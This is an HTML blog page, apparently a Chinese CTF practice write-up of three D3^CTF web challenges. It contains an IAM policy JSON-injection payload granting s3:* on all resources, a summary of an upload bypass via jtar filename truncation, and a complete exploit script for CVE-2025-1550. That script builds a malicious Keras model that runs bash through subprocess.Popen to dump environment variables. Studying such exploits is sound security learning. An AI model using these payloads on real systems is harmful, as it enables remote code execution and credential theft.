@@ -1,0 +1,648 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jpg">
+  <link rel="icon" href="/img/logo.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="aidemofashi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="D3^CTF 复现学习：d3invitation考点： AWS IAM（Identity and Access Management）策略 json 注入 看官方wp和问ai很清楚了， 1234567891011由于session_token里的可访问内容是可由用户控制的，所以能用文件名来控制session_token  实现注入访问  注意在json里要包含双引号的话要用\来转义  如 &amp;quo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D3^CTF复现学习">
+<meta property="og:url" content="https://aidemofashi.github.io/2025/10/07/D3-CTF%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="aidemofashi&#39;s blog">
+<meta property="og:description" content="D3^CTF 复现学习：d3invitation考点： AWS IAM（Identity and Access Management）策略 json 注入 看官方wp和问ai很清楚了， 1234567891011由于session_token里的可访问内容是可由用户控制的，所以能用文件名来控制session_token  实现注入访问  注意在json里要包含双引号的话要用\来转义  如 &amp;quo">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-10-06T21:39:55.000Z">
+<meta property="article:modified_time" content="2025-10-06T21:40:57.651Z">
+<meta property="article:author" content="aidemofashi">
+<meta property="article:tag" content="刷题">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>D3^CTF复现学习 - aidemofashi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"aidemofashi.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>aidemofashi&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="http://39.105.15.250/aidemofashi_home/index.html" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/main.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="D3^CTF复现学习"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-07 05:39" pubdate>
+          2025年10月7日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          780 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          7 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">D3^CTF复现学习</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="D3-CTF-复现学习："><a href="#D3-CTF-复现学习：" class="headerlink" title="D3^CTF 复现学习："></a>D3^CTF 复现学习：</h1><h2 id="d3invitation"><a href="#d3invitation" class="headerlink" title="d3invitation"></a>d3invitation</h2><p>考点： AWS IAM（Identity and Access Management）策略 json 注入</p>
+<p>看官方wp和问ai很清楚了，</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><br>由于session_token里的可访问内容是可由用户控制的，所以能用文件名来控制session_token  <br><br>实现注入访问  <br><br>注意在json里要包含双引号的话要用\来转义  如 <span class="hljs-string">&quot;\</span><br><br>接下来使用这个 STS 临时凭证访问 MinIO 的 api 接口即可拿到 flag<br><br>进行访问为例<br><br></code></pre></td></tr></table></figure>
+
+<p>问题是我不会用mc连接</p>
+<p>payload:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><br><span class="hljs-string">&quot;*\&quot; ]&#125;,&#123;\&quot;Effect\&quot;:\&quot;Allow\&quot;,\&quot;Action\&quot;:[\&quot;s3:*\&quot;],\&quot;Resource\&quot;:[\&quot;arn:aws:s3:::*&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>在json中要添加双引号字符需要用\来转义</p>
+<h2 id="d3jtar"><a href="#d3jtar" class="headerlink" title="d3jtar"></a>d3jtar</h2><p>这题docker搭出来有问题，直接看官方wp吧：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br>解题的关键在于工具类 <span class="hljs-keyword">Backup </span>所使用的 <span class="hljs-keyword">jtar </span>打包库。在使用<br><br><span class="hljs-keyword">jtar </span>的 TarOutputStream 打包文件时，它会把文件名中的 unicode 强制转化为 ascii 码，<br><br>从而发生字符截断。利用这一点，我们可以将后缀带有特定 unicode 字符的文件上传<br><br>至靶机，绕过后缀黑名单检查，通过备份与恢复功能将上传的文件转变为 <span class="hljs-keyword">jsp </span>后缀的文<br><br>件并放回 <span class="hljs-keyword">jsp </span>可解析目录，最终 RCE 获取 flag<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="d3model"><a href="#d3model" class="headerlink" title="d3model"></a>d3model</h2><p>考点：Keras 模型文件的安全性问题</p>
+<p>源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> keras<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><br><span class="hljs-keyword">import</span> os<br><br><br><br>defis_valid_model(modelname):<br><br>    <span class="hljs-keyword">try</span>:<br><br>        keras.models.load_model(modelname)<br><br>    <span class="hljs-keyword">except</span>:<br><br>        returnFalse<br><br>    returnTrue<br><br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><br>defindex():<br><br>    returnopen(<span class="hljs-string">&#x27;index.html&#x27;</span>).read()<br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><br>defupload_file():<br><br>    <span class="hljs-keyword">if</span><span class="hljs-string">&#x27;file&#x27;</span>notin request.files:<br><br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;No file part&#x27;</span>&#125;), <span class="hljs-number">400</span><br><br>  <br><br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>  <br><br>    <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br><br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;No selected file&#x27;</span>&#125;), <span class="hljs-number">400</span><br><br>  <br><br>    MAX_FILE_SIZE = <span class="hljs-number">50</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>  <span class="hljs-comment"># 50MB</span><br><br>    file.seek(<span class="hljs-number">0</span>, os.SEEK_END)<br><br>    file_size = file.tell()<br><br>    file.seek(<span class="hljs-number">0</span>)<br><br>  <br><br>    <span class="hljs-keyword">if</span> file_size &gt; MAX_FILE_SIZE:<br><br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="hljs-number">400</span><br><br>  <br><br>    filepath = os.path.join(<span class="hljs-string">&#x27;./&#x27;</span>, <span class="hljs-string">&#x27;test.keras&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> os.path.exists(filepath):<br><br>        os.remove(filepath)<br><br>    file.save(filepath)<br><br>  <br><br>    <span class="hljs-keyword">if</span> is_valid_model(filepath):<br><br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Model is valid&#x27;</span>&#125;), <span class="hljs-number">200</span><br><br>    <span class="hljs-keyword">else</span>:<br><br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="hljs-number">400</span><br><br><br>if__name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>没接触过</p>
+<p>但是原理wp上给了：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>此题目基于 CVE-<span class="hljs-number">2025</span>-<span class="hljs-number">1550</span>.<br><br>当调用函数 keras<span class="hljs-selector-class">.models</span><span class="hljs-selector-class">.load_model</span> 加载恶意 keras 文件时，其中特殊构造的<br><br>config<span class="hljs-selector-class">.json</span> 可以触发 RCE (Remote Code Execution).<br><br></code></pre></td></tr></table></figure>
+
+<p>上网找exp即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">import</span> zipfile<br><br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">from</span> keras.models <span class="hljs-keyword">import</span> Sequential<br><br><span class="hljs-keyword">from</span> keras.layers <span class="hljs-keyword">import</span> Dense<br><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br>model_name = <span class="hljs-string">&quot;test.keras&quot;</span><br><br><br>x_train = np.random.rand(<span class="hljs-number">100</span>, <span class="hljs-number">28</span> * <span class="hljs-number">28</span>)<br><br>y_train = np.random.rand(<span class="hljs-number">100</span>)<br><br><br>model = Sequential([Dense(<span class="hljs-number">1</span>, activation=<span class="hljs-string">&#x27;linear&#x27;</span>, input_dim=<span class="hljs-number">28</span> * <span class="hljs-number">28</span>)])<br><br><br>model.<span class="hljs-built_in">compile</span>(optimizer=<span class="hljs-string">&#x27;adam&#x27;</span>, loss=<span class="hljs-string">&#x27;mse&#x27;</span>)<br><br>model.fit(x_train, y_train, epochs=<span class="hljs-number">5</span>)<br><br>model.save(model_name)<br><br><br><span class="hljs-keyword">with</span> zipfile.ZipFile(model_name, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br><br>    config = json.loads(f.read(<span class="hljs-string">&quot;config.json&quot;</span>).decode())<br><br><br>config[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;module&quot;</span>] = <span class="hljs-string">&quot;keras.models&quot;</span><br><br>config[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;class_name&quot;</span>] = <span class="hljs-string">&quot;Model&quot;</span><br><br>config[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;config&quot;</span>] = &#123;<br><br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;mvlttt&quot;</span>,<br><br>    <span class="hljs-string">&quot;layers&quot;</span>: [<br><br>        &#123;<br><br>            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;mvlttt&quot;</span>,<br><br>            <span class="hljs-string">&quot;class_name&quot;</span>: <span class="hljs-string">&quot;function&quot;</span>,<br><br>            <span class="hljs-string">&quot;config&quot;</span>: <span class="hljs-string">&quot;Popen&quot;</span>,<br><br>            <span class="hljs-string">&quot;module&quot;</span>: <span class="hljs-string">&quot;subprocess&quot;</span>,<br><br>            <span class="hljs-string">&quot;inbound_nodes&quot;</span>: [&#123;<span class="hljs-string">&quot;args&quot;</span>: [[<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;env&gt;&gt;index.html&quot;</span>]], <span class="hljs-string">&quot;kwargs&quot;</span>: &#123;<span class="hljs-string">&quot;bufsize&quot;</span>: -<span class="hljs-number">1</span>&#125;&#125;]<br><br>        &#125;],<br><br>    <span class="hljs-string">&quot;input_layers&quot;</span>: [[<span class="hljs-string">&quot;mvlttt&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]],<br><br>    <span class="hljs-string">&quot;output_layers&quot;</span>: [[<span class="hljs-string">&quot;mvlttt&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]<br><br>&#125;<br><br><br><span class="hljs-keyword">with</span> zipfile.ZipFile(model_name, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zip_read:<br><br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(<span class="hljs-string">f&quot;tmp.<span class="hljs-subst">&#123;model_name&#125;</span>&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> zip_write:<br><br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> zip_read.infolist():<br><br>            <span class="hljs-keyword">if</span> item.filename != <span class="hljs-string">&quot;config.json&quot;</span>:<br><br>                zip_write.writestr(item, zip_read.read(item.filename))<br><br><br>os.remove(model_name)<br><br>os.rename(<span class="hljs-string">f&quot;tmp.<span class="hljs-subst">&#123;model_name&#125;</span>&quot;</span>, model_name)<br><br><br><span class="hljs-keyword">with</span> zipfile.ZipFile(model_name, <span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">as</span> zf:<br><br>    zf.writestr(<span class="hljs-string">&quot;config.json&quot;</span>, json.dumps(config))<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Malicious model ready&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%88%B7%E9%A2%98/" class="print-no-link">#刷题</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>D3^CTF复现学习</div>
+      <div>https://aidemofashi.github.io/2025/10/07/D3-CTF复现学习/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>aidemofashi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/07/%E8%BF%91%E6%9C%9F%E7%9A%84%E6%84%9F%E8%A7%89/" title="近期的感觉">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">近期的感觉</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/07/ACTF2025%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" title="ACTF2025复现学习">
+                        <span class="hidden-mobile">ACTF2025复现学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
